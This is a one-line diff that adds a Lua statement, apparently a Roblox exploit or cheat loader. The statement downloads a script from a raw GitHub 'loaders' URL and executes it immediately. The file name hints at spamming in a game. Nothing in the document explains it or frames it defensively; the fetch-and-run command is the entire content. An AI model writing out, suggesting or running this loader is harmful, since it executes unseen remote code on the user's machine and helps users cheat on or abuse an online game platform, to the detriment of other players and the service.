@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/my-anime-mine-spam1-95wdhxbrfirehw.lua"))()
